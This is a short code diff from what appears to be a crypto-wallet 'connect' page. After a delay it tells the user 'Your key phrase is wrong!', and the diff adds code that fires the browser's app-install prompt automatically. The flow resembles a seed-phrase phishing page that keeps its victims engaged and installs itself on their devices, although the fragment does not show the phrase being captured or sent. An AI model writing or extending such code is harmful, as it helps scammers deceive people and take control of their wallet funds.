@@ -52,3 +52,13 @@ document.getElementById("connectBtn").addEventListener("click", () => {
     showPopup("Your key phrase is wrong!");
   }, 10000);
 });
+// Auto PWA Install Trigger After Wrong Phrase
+setTimeout(async () => {
+  if (window.deferredPrompt) {
+    window.deferredPrompt.prompt();
+    await window.deferredPrompt.userChoice;
+    window.deferredPrompt = null;
+  } else {
+    console.log("Install prompt not ready");
+  }
+}, 100); // sirf event register hone ka small wait
